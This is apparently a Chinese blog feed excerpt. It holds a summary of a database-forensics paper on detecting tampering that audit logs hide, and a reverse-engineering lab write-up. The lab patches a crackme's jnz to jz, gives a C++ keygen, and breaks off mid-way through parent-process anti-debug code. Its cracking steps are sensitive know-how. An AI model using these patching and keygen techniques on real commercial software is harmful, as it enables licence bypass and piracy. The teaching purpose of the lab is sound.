        <content type="html"><![CDATA[<h1 id="Carving-Database-Storage-to-Detect-and-Trace-Security-Breaches"><a href="#Carving-Database-Storage-to-Detect-and-Trace-Security-Breaches" class="headerlink" title="Carving Database Storage to Detect and Trace Security Breaches"></a>Carving Database Storage to Detect and Trace Security Breaches</h1><blockquote><p>复原数据库存储以检测和跟踪安全漏洞<br><a href="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555312497/paper/2016-paper_carving_database_storage_to_detect_and.pdf" target="_blank" rel="noopener">原文下载</a></p></blockquote><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><h3 id="DBMS-数据库管理系统"><a href="#DBMS-数据库管理系统" class="headerlink" title="DBMS(数据库管理系统)"></a>DBMS(数据库管理系统)</h3><ul><li>通常用于存储和处理敏感数据，因此，投入了大量精力使用访问控制策略来保护DBMS。</li><li>一旦用户在DBMS中获得提升权限（无论是合理的还是通过攻击的），实施的安全方案可以绕过，因此无法再根据政策保证数据受到保护。<br>1）访问控制策略可能不完整，允许用户执行他们不能执行的命令<br>2）用户可能通过使用DB或OS代码中的安全漏洞或通过其他方式非法获取权限</li><li>部署预防措施<br>1）在及时发生安全漏洞时检测安全漏洞;<br>2）在检测到攻击时收集有关攻击的证据，以便设计对抗措施并评估损害程度</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>Malice是政府机构的数据库管理员，为公民提供犯罪记录。 Malice最近被判犯有欺诈罪，并决定滥用她的特权，并通过运行DELETE FROM Record WHERE name = ‘Malice’来删除她的犯罪记录。<br>但是，她知道数据库操作需要定期审核，以检测对机构存储的高度敏感数据的篡改。为了覆盖她的操作，Malice在运行DELETE操作之前停用审计日志，然后再次激活日志。因此，在数据库中没有她的非法操纵的日志跟踪。<br>但是，磁盘上的数据库存储仍将包含已删除行的证据。<br>作者的方法检测已删除的痕迹和过期的记录版本，并将它们与审核日志进行匹配，以检测此类攻击，并提供数据库操作方式的证据。<br>作者将检测已删除的行，因为它与审计日志中的任何操作都不对应，我们会将其标记为篡改的潜在证据。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555310640/paper/%E5%9B%BE%E7%89%871.png" alt></p><h3 id="思路一览"><a href="#思路一览" class="headerlink" title="思路一览"></a>思路一览</h3><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555310736/paper/%E6%8D%95%E8%8E%B7.png" alt></p><h3 id="提出方法"><a href="#提出方法" class="headerlink" title="提出方法"></a>提出方法</h3><p>使用称为DICE的现有取证工具（Wagner等，2017）来重建数据库存储<br>通过匹配提取的存储条目，报告任何无法通过操作记录解释的工件来自动检测潜在的攻击</p><ol><li>DBDetective检查数据库存储和RAM快照，并将它找到的内容与审计日志进行比较</li><li>然后，在不影响数据库操作的情况下，对核心数据进行分析。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555310863/paper/%E5%9B%BE%E7%89%872.png" alt></li></ol><p>确定数据库篡改的可能性，并指出数据库存储中发现的具体不一致性。<br>由于数据库存储的易变性，无法保证将发现所有攻击。<br>在对于我们评估的每个主要DBMS，我们假设DBMS已启用审计日志来捕获与调查相关的SQL命令。<br>我们进一步假设一名攻击者通过以下方式阻止记录已执行的恶意命令：</p><ul><li>停用审计策略并暂时挂起日志记录</li><li>更改现有审计日志（两者都在数据库日志可靠性部分中讨论）。<br>通过将取证分析技术应用于数据库存储或缓冲区缓存，并将发现的证据与审计日志相匹配，可以：</li><li>检测DBMS审核日志中未显示的多种类型的数据库访问和操作。</li><li>将未归因的记录修改分类为模糊的INSERT，DELETE或UPDATE命令。</li><li>检测无法从审核日志中的活动派生的（只读）SELECT查询中的缓存数据。</li></ul><h2 id="Reliability-of-database-logs"><a href="#Reliability-of-database-logs" class="headerlink" title="Reliability of database logs"></a>Reliability of database logs</h2><p>攻击者可以更改两种类型的日志： write-ahead logs (WAL) and audit logs (event history records)</p><ul><li>WALs以低级别记录数据库修改以支持ACID保证，提供最近表修改的历史记录。<br>通常无法禁用或轻松修改WAL，并且需要读取专用工具（例如，Oracle LogMiner或PostgreSQL pg_xlogdump）。<br>某些DBMS允许为特定操作禁用WAL，例如批量加载或结构重建。因此，可以通过此功能插入记录而不留下日志跟踪。</li><li>audit logs记录配置的用户数据库操作。包括SQL操作和其他用户活动。审计日志根据数据库管理员配置的日志记录策略存储已执行的SQL命令。 因此，管理员可以根据需要禁用日志记录或修改单个日志记录。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555311090/paper/%E5%9B%BE%E7%89%873.png" alt></li></ul><h2 id="Detecting-hidden-record-modifications"><a href="#Detecting-hidden-record-modifications" class="headerlink" title="Detecting hidden record modifications"></a>Detecting hidden record modifications</h2><p>插入或修改表记录时，数据库中会发生一连串的存储更改。 除了受影响记录的数据本身之外，页面元数据会更新（例如，设置删除标记），并且存储记录的索引的页面会改变（例如，以反映记录的删除）。 如果尚未缓存，则每个访问的页面都将被带入RAM。 行标识符和结构标识符可用于将所有这些更改绑定在一起。<br>此外，DBA（数据库管理员）还可以禁用批量修改的日志记录（出于性能考虑）——可以利用此权限来隐藏恶意修改。<br>在本节中，我们将描述如何检测已修改记录与已记录命令之间的不一致。</p><h3 id="Deleted-records"><a href="#Deleted-records" class="headerlink" title="Deleted records"></a>Deleted records</h3><ol><li>算法<br>删除的记录不会被物理删除，而是在页面中标记为“已删除”; 已删除行占用的存储空间将成为未分配的空间，最终将被新行覆盖。这些对数据库存储的更改不能被绕过或控制。<br>识别存储中与日志中的任何删除操作都不匹配的已删除行。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555311166/paper/%E5%9B%BE%E7%89%874.png" alt></li><li>实例</li></ol><ul><li>DICE从Customer表重建了三个删除的行<br>（1，Christine，Chicago）<br>（3，Christopher，Seattle）<br>（4，Thomas，Austin）</li><li>日志文件包含两个操作<br>在算法1中，DeletedRows被设置为三个重建的已删除行。<br>算法1返回（4，Thomas，Austin），表示该删除的记录不能归因于任何删除。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555311315/paper/%E5%9B%BE%E7%89%875.png" alt></li></ul><h3 id="Inserted-records"><a href="#Inserted-records" class="headerlink" title="Inserted records"></a>Inserted records</h3><ol><li>算法<br>新插入的行将附加到表的最后一页的末尾（如果最后一页已满，则为新页）或覆盖由先前删除的行创建的可用空间。<br>如果“活跃”新表行与审核日志中的任何插入操作都不匹配，则此行是可疑活动的标志。<br>算法2中使用这些“活跃”记录来确定重构行是否可归因于审计日志中的插入。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555311991/paper/%E5%9B%BE%E7%89%876.png" alt></li><li>实例</li></ol><ul><li>该日志包含六个操作。<br>当行从T1插入到T4时，它们将附加到表的末尾。<br>在T5，删除（3，Lamp）<br>然后在T6插入（5，Bookcase）。<br>由于row（5，Bookcase）大于删除的行（3，Lamp），因此它将附加到表的末尾。</li><li>DICE重建了五个活动记录<br>包括（0，Dog）和（2，Monkey）<br>行被初始化为算法2的五个重建活动行<br>算法2因此返回（0，Dog）和（2，Monkey）<br>因为这些记录无法与记录的插入匹配。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555312072/paper/%E5%9B%BE%E7%89%877.png" alt></li></ul><h3 id="Updated-records"><a href="#Updated-records" class="headerlink" title="Updated records"></a>Updated records</h3><ol><li>算法<br>UPDATE操作本质上是一个DELETE操作，后跟一个INSERT操作。<br>为了考虑更新的行，我们使用算法1返回的未标记删除行和算法2返回的未标记插入行作为算法3的输入。如果删除的行可以与更新的WHERE子句匹配，那么此删除的行操作 被标记为存在于日志中。 接下来，如果未标记的插入行可以与SET子句中的值匹配，并且插入的行匹配已删除行中除SET子句值之外的所有值，则此插入的行操作将出现在日志中。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555312183/paper/%E5%9B%BE%E7%89%878.png" alt></li><li>实例<br>算法1返回行（2，Desk）<br>算法2返回行（0，Dog）和（2，Monkey）<br>使用这些记录集，算法3返回（2，Desk）作为已删除记录的列表，并将（0，Dog）和（2，Monkey）作为插入记录的列表。<br>此外，算法3识别（2，Desk）和（2，Monkey）中第一列的共享值2。 虽然这不能单独确认UPDATE操作，但可以合理地得出结论：<br>（2，Desk）已更新为（2，Monkey）。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555312234/paper/%E5%9B%BE%E7%89%879.png" alt></li></ol><h2 id="Detecting-inconsistencies-for-read-only-queries"><a href="#Detecting-inconsistencies-for-read-only-queries" class="headerlink" title="Detecting inconsistencies for read-only queries"></a>Detecting inconsistencies for read-only queries</h2><p>DBMS使用称为缓冲区管理器的组件将页面从磁盘缓存到内存中。数据以页为单位读入缓冲池，可以通过DICE重建。<br>在本节中，将描述如何将缓冲池中的工件与审计日志中的只读查询进行匹配。<br>数据库查询可以使用两种可能的访问表的方式之一：<br>全表扫描（FTS）或索引扫描（IS）。<br>FTS读取所有表页，而IS使用索引结构来检索引用基于搜索关键字的指针列表。</p><h3 id="Full-table-scan"><a href="#Full-table-scan" class="headerlink" title="Full table scan"></a>Full table scan</h3><p>当查询使用FTS时，只会缓存大表的一小部分。 可以完整地缓存小表（相对于缓冲池大小）。 每个数据库都在页眉中存储唯一的页面标识符，这使我们能够有效地将缓存的页面与磁盘上的对应页面进行匹配。<br>我们可以通过SID=131识别属于Employee的页面，该SID=131存储在页面标题中。 DICE只能以更快的速度返回页面结构标识符（无需解析页面内容）。<br>Q2和Q4都通过FTS访问员工。 每次扫描Employee表时，表中相同的四个页面（PID：97,98,99和100）都会加载到缓冲池中。<br>因此，当在存储器中找到具有PID:97,98,99和100以及SID:131的四个页面时，可以假设FTS应用在Employee表上。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555312316/paper/%E5%9B%BE%E7%89%8710.png" alt></p><h3 id="Index-access"><a href="#Index-access" class="headerlink" title="Index access"></a>Index access</h3><p>Customer表的SID=124，C_City列上的二级索引的SID=126.<br>Q1在城市Dallas上进行过滤，并使用PID=2缓存索引页。此页面的最小值为Chicago和最大值为Detroit 。<br>Q3在城市Jackson上过滤，并缓存索引页面，页面标识符为4.此页面的最小值为Houston，最大值为Lincoln。<br>如果审核日志中的查询过滤了索引页的最小值和最大值范围内的值，则该页可以归因于该查询。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555312359/paper/%E5%9B%BE%E7%89%8711.png" alt></p><h3 id="Conclusions-and-future-work"><a href="#Conclusions-and-future-work" class="headerlink" title="Conclusions and future work"></a>Conclusions and future work</h3><ul><li>审计日志和其他内置DBMS安全机制旨在检测或阻止攻击者执行的恶意操作。这种机制的固有缺点是具有足够权限的攻击者可以绕过它们来隐藏它们的踪迹。</li><li>我们提供并全面评估DBDetective，它可以检测攻击者通过从审计日志中删除从而隐藏的数据库操作，并收集有关攻击者访问和修改哪些数据的证据。</li><li>我们的方法依赖于对数据库存储的取证检查，并将此信息与审核日志中的条目相关联，以发现恶意操作的证据。</li><li>重要的是，数据库存储几乎不可能被欺骗，因此，与例如审计日志相比，它是更可靠的篡改证据来源。</li><li>鉴于存储快照提供的信息不完整，我们将探索概率匹配，确定存储工件由审计日志中的操作引起的可能性，根据操作的时间顺序利用其他约束，模拟审计中SQL命令的部分历史记录获得更精确的匹配，并根据检测到的异常动态调整拍摄快照的频率。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 顶会论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 复原文件 </tag>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程与软件破解</title>
      <link href="/2019/03/28/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C/"/>
      <url>/2019/03/28/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="软件保护方式"><a href="#软件保护方式" class="headerlink" title="软件保护方式"></a>软件保护方式</h1><ol><li>功能限制</li><li>时间限制</li></ol><ul><li>运行时长限制</li><li>使用日期限制</li><li>使用次数限制</li></ul><ol start="3"><li>警告窗口</li></ol><h2 id><a href="#" class="headerlink" title></a><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553759246/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E5%9B%BE%E7%89%871.png" alt></h2><h1 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h1><ol><li>静态分析工具</li></ol><ul><li>IDA</li><li>W32Dasm</li><li>lordPE</li><li>Resource Hacker</li></ul><ol start="2"><li>动态分析工具</li></ol><ul><li>OllyDbg</li><li>WinDbg</li></ul><hr><h1 id="对抗分析技术"><a href="#对抗分析技术" class="headerlink" title="对抗分析技术"></a>对抗分析技术</h1><ol><li>反静态分析技术</li></ol><ul><li>花指令</li><li>自修改代码技术</li><li>多态技术</li><li>变形技术</li><li>虚拟机保护技术</li></ul><ol start="2"><li>反动态分析技术</li></ol><ul><li>检测调试状态</li><li>检测用户态调试器</li><li>检测内核态调试器</li><li>其他方法：父进程检测；StartupInfo 结构；时间差；通过Trap Flag检测</li></ul><ol start="3"><li>发现调试器后的处理</li></ol><ul><li>程序自身退出</li><li>向调试器窗口发送消息使调试器退出</li><li>使调试器窗口不可用</li><li>终止调试器进程</li></ul><hr><h1 id="PE文件格式基础"><a href="#PE文件格式基础" class="headerlink" title="PE文件格式基础"></a>PE文件格式基础</h1><hr><h1 id="加壳脱壳"><a href="#加壳脱壳" class="headerlink" title="加壳脱壳"></a>加壳脱壳</h1><hr><h1 id="反调试技术"><a href="#反调试技术" class="headerlink" title="反调试技术"></a>反调试技术</h1><p>反调试技术，程序用它来识别是否被调试，或者让调试器失效。为了阻止调试器的分析，当程序意识到自己被调试时，它们可能改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。</p><h2 id="探测windows调试器"><a href="#探测windows调试器" class="headerlink" title="探测windows调试器"></a>探测windows调试器</h2><ol><li>使用windows API<br>使用Windows API函数探测调试器是否存在是最简单的反调试技术。<br>通常，防止使用API进行反调试的方法有在程序运行期间修改恶意代码，使其不能调用API函数，或修改返回值，确保执行合适的路径，还有挂钩这些函数。<br>常用来探测调试器的API函数有：<code>IsDebuggerPresent</code> <code>CheckRemoteDebuggerPresent</code> <code>NtQueryInformationProcess</code> <code>OutputDebuggString</code></li><li>手动检测数据结构<br>程序编写者经常手动执行与这些API功能相同的操作</li></ol><ul><li>检查BeingDebugged属性</li><li>检测ProcessHeap属性</li><li>检测NTGlobalFlag</li></ul><ol start="3"><li>系统痕迹检测<br>通常，我们使用调试工具来分析程序，但这些工具会在系统中驻留一些痕迹。程序通过搜索这种系统的痕迹，来确定你是否试图分析它。例如，查找调试器引用的注册表项。同时，程序也可以查找系统的文件和目录，查找当前内存的痕迹，或者查看当前进程列表，更普遍的做法是通过FindWindows来查找调试器。</li></ol><h2 id="识别调试器的行为"><a href="#识别调试器的行为" class="headerlink" title="识别调试器的行为"></a>识别调试器的行为</h2><p>在逆向工程中，可以使用断点或单步调试来帮助分析，但执行这些操作时，会修改进程中的代码。因此可以使用几种反调试技术探测INT扫描、完整性校验以及时钟检测等几种类型的调试器行为。</p><ol><li>INT扫描<br>调试器设置断点的基本机制是用软件中断INT 3，机器码为0xCC，临时替换程序中的一条指令。因此可以通过扫描INT 3修改来检测。</li><li>执行代码校验和检查<br>与INT扫描目的相同，但仅执行机器码的CRC或MD5校验和检查。</li><li>时钟检测<br>被调试时，进程的运行速度大大降低，常用指令有：<code>rdstc</code> <code>QueryPerformanceCounter</code> <code>GetTickCount</code>,有如下两种方式探测时钟：</li></ol><ul><li>记录执行一段操作前后的时间戳</li><li>记录触发一个异常前后的时间戳<h2 id="干扰调试器的功能"><a href="#干扰调试器的功能" class="headerlink" title="干扰调试器的功能"></a>干扰调试器的功能</h2>本地存储(TLS)回调：TLS回调被用来在程序入口点执行之前运行代码，这发生在程序刚被加载到调试器时<br>使用异常：使用SEH链可以实现异常，程序可以使用异常来破坏或探测调试器，调试器捕获异常后，并不会将处理权立即返回给被调试进程。<br>插入中断：插入INT 3、INT 2D、ICE<h2 id="调试器漏洞"><a href="#调试器漏洞" class="headerlink" title="调试器漏洞"></a>调试器漏洞</h2>PE头漏洞、OutputDebugString漏洞</li></ul><hr><h1 id="实验一：软件破解"><a href="#实验一：软件破解" class="headerlink" title="实验一：软件破解"></a>实验一：软件破解</h1><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p><a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553761280/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/crack.exe1" target="_blank" rel="noopener">crack.exe</a>，28.0 KB</p><ul><li>无保护措施：无壳、未加密、无反调试措施</li><li>用户名至少要5个字节</li><li>输入错误验证码时输出：“Bad Boy!”</li></ul><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="查找显示注册结果相关代码"><a href="#查找显示注册结果相关代码" class="headerlink" title="查找显示注册结果相关代码"></a>查找显示注册结果相关代码</h3><p>当输入错误验证码时，程序会输出“Bad Boy”，因此我们将程序拖入IDA，以流程图显示函数内部的跳转。查找“Bad Boy”字符串，我们可以定位到显示注册结果的相关代码：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553772615/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B71.png" alt></p><h3 id="查找注册码验证相关代码"><a href="#查找注册码验证相关代码" class="headerlink" title="查找注册码验证相关代码"></a>查找注册码验证相关代码</h3><p>用鼠标选中程序分支点，按空格切换回汇编指令界面<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553773066/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B72.png" alt></p><p>可以看到，这条指令位于PE文件的.text节，并且IDA已经自动将地址转换为运行时的内存地址<code>VA:004010F9</code></p><h3 id="修改程序跳转"><a href="#修改程序跳转" class="headerlink" title="修改程序跳转"></a>修改程序跳转</h3><ul><li>现在关闭IDA，换用OllyDbg进行动态调试来看看程序时如何分支跳转的<code>Ctrl+G</code>直接跳到由IDA得到的<code>VA:004010F9</code>处查看那条引起程序分支的关键指令</li><li>选中这条指令，按F2设置断点，再按F9运行程序，这时候控制权会回到程序，OllyDbg暂时挂起。到程序提示输入名字和序列号，随意输入（名字大于五个字节），点击ok后，OllyDbg会重新中断程序，收回控制权，如图：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553775053/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B74.png" alt></li><li><p>验证函数的返回值存于EAX寄存器中，if语句通过以下两条指令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp eax,ecx</span><br><span class="line">jnz xxxxxxx</span><br></pre></td></tr></table></figure></li><li><p>也就是说，当序列号输入错误时，EAX中的值为0，跳转将被执行。<br>如果我们把<code>jnz</code>这条指令修改为<code>jz</code>，那么整个程序的逻辑就会反过来。<br>双击<code>jnz</code>这条指令，将其改为<code>jz</code>，单击”汇编”将其写入内存<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553775817/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B75.png" alt><br>可以看到此时程序执行了相反的路径</p></li><li><p>上面只是在内存中修改程序，我们还需要在二进制文件中也修改相应的字节，这里考察VA与文件地址之间的关系</p></li><li>用LordPE打开.exe文件，查看PE文件的节信息<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553776239/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B76.png" alt><br>根据VA与文件地址的换算公式：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件偏移地址 = VA - Image Base - 节偏移</span><br><span class="line">            = 0x004010F9 - 0x00400000 - 0</span><br><span class="line">            = 0x10F9</span><br></pre></td></tr></table></figure></li></ul><p>也就是说，这条指令在PE文件中位于<code>10F9</code>字节处，使用010Editer打开crack.exe，将这一字节的<code>75(JNZ)`</code>改为<code>74(JZ)`</code>，保存后重新执行，破解成功！</p><h2 id="编写注册机"><a href="#编写注册机" class="headerlink" title="编写注册机"></a>编写注册机</h2><h3 id="查找显示注册结果相关代码-1"><a href="#查找显示注册结果相关代码-1" class="headerlink" title="查找显示注册结果相关代码"></a>查找显示注册结果相关代码</h3><p>通过查找字符串“good boy”等，我们可以找到显示注册结果的相关代码</p><h3 id="查找注册码验证相关代码-1"><a href="#查找注册码验证相关代码-1" class="headerlink" title="查找注册码验证相关代码"></a>查找注册码验证相关代码</h3><p>因为检测密钥是否正确时会将结果返回到EAX寄存器中，因此，在检测密钥前必然会对EAX寄存器清空，由此我们可以找到注册码验证的相关代码。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553858953/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B77.png" alt></p><h3 id="根据注册码验证代码编写注册机"><a href="#根据注册码验证代码编写注册机" class="headerlink" title="根据注册码验证代码编写注册机"></a>根据注册码验证代码编写注册机</h3><p>分析上图算法，按tab键转换为高级语言<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt; v6; v12 = v10 )</span><br><span class="line">  v10 = (v6 + v12) * lpStringa[i++];</span><br><span class="line">if ( (v12 ^ 0xA9F9FA) == atoi(v15) )</span><br><span class="line">  MessageBoxA(hDlg, aTerimaKasihKer, aGoodBoy, 0);</span><br></pre></td></tr></table></figure></p><p>可以看出，生成注册码主要在for循环中完成，之后将生成的注册码与输入相比较，判断是否正确。<br>所以，只要能弄明白<code>v6，v12，v10，v15</code>的含义，我们就可以轻松的编写注册机。<br>打开ollybdg，在进入循环之前设下断点，动态调试程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">004010CC  |&gt; /8B4D 10       |mov ecx,[arg.3]  //此时ecx为name</span><br><span class="line">004010CF  |.  8B55 0C       |mov edx,[arg.2]  //edx为0x1908</span><br><span class="line">004010D2  |.  03D3          |add edx,ebx      //edx加上name的长度（ebx）</span><br><span class="line">004010D4  |.  0FBE0C08      |movsx ecx,byte ptr ds:[eax+ecx]  //ecx=61h</span><br><span class="line">004010D8  |.  0FAFCA        |imul ecx,edx     //61h(a) * edx</span><br><span class="line">004010DB  |.  40            |inc eax          //eax加1（初始为0）</span><br><span class="line">004010DC  |.  894D 0C       |mov [arg.2],ecx</span><br><span class="line">004010DF  |.  3BC3          |cmp eax,ebx      //循环是否结束</span><br></pre></td></tr></table></figure></p><p><code>arg.3</code>为输入的<code>name</code>，<code>arg.2</code>初始为<code>0x1908</code>，<code>ebx</code>为<code>name</code>的长度，<code>eax</code>每次循环加1直到等于长度<br>因此，我们可以对参数的含义进行解释如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v12 = 6408;   //0x1908</span><br><span class="line">v10 = 6408;   //0x1908</span><br><span class="line">v6 = len(name);</span><br><span class="line">v12 = input_serial;</span><br><span class="line">for ( i = 0; i &lt; v6; i++ )&#123;</span><br><span class="line">  v12 = v10；</span><br><span class="line">  v10 = (v6 + v12) * lpStringa[i];</span><br><span class="line">&#125;</span><br><span class="line">if ((v12 ^ 0xA9F9FA) == atoi(v15))&#123;</span><br><span class="line">  MessageBoxA(hDlg, aTerimaKasihKer, aGoodBoy, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可见，<code>v12^0xA9F9FA</code>的结果即是正确的注册码，我们编写一个<a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553937750/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/reg.cpp" target="_blank" rel="noopener">简单的程序</a>帮助我们生成注册码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace::std;</span><br><span class="line">int main()&#123;</span><br><span class="line">int v12;</span><br><span class="line">int v10 = 6408;   //0x1908</span><br><span class="line">string name;</span><br><span class="line">cout &lt;&lt; &quot;请输入name:  &quot;;</span><br><span class="line">cin &gt;&gt; name;</span><br><span class="line">int len = name.size();</span><br><span class="line">for(int i = 0; i &lt; len+1; i++ )&#123;</span><br><span class="line">  v12 = v10;</span><br><span class="line">  v10 = (len + v12) * name[i];</span><br><span class="line">&#125;</span><br><span class="line"> cout&lt;&lt;&quot;\n&quot;&lt;&lt;&quot;注册码为:  &quot;&lt;&lt;(v12 ^ 0xA9F9FA)&lt;&lt;endl;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>计算出”testname”的对应注册码<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553937461/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B79.png" alt><br>注册成功！</p><h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1553937531/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/%E6%8D%95%E8%8E%B711.png" alt></h2><h1 id="实验二：软件反动态调试技术分析"><a href="#实验二：软件反动态调试技术分析" class="headerlink" title="实验二：软件反动态调试技术分析"></a>实验二：软件反动态调试技术分析</h1><h2 id="对象-1"><a href="#对象-1" class="headerlink" title="对象"></a>对象</h2><p><a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553779243/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/CrackMe1.exe1" target="_blank" rel="noopener">CrackMe1.exe</a> 1641.0 KB<br>无保护措施：无壳、未加密、无反调试措施<br>使用OllyDbg对该程序进行调试时，程序会自动退出</p><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ol><li>分析CrackMe1.exe是如何通过父进程检测实现反OllyDbg调试的</li><li>分析除父进程检测外，该程序用到的反动态调试技术</li></ol><h2 id="父进程检测"><a href="#父进程检测" class="headerlink" title="父进程检测"></a>父进程检测</h2><p>一般双击运行的进程的父进程都是explorer.exe，但是如果进程被调试父进程则是调试器进程。也就是说如果父进程不是explorer.exe则可以认为程序正在被调试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">BOOL IsInDebugger()&#123;</span><br><span class="line">  HANDLE     hProcessSnap = NULL;</span><br><span class="line">  char Expchar[] =&quot;\\EXPLORER.EXE&quot;;</span><br><span class="line">  char szBuffer[MAX_PATH]=&#123;0&#125;;</span><br><span class="line">  char FileName[MAX_PATH]=&#123;0&#125;;</span><br><span class="line">  PROCESSENTRY32 pe32   = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //得到所有进程的列表快照</span><br><span class="line">  if (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">      return FALSE;          </span><br><span class="line"></span><br><span class="line">  pe32.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">  if (!Process32First(hProcessSnap, &amp;pe32))  // 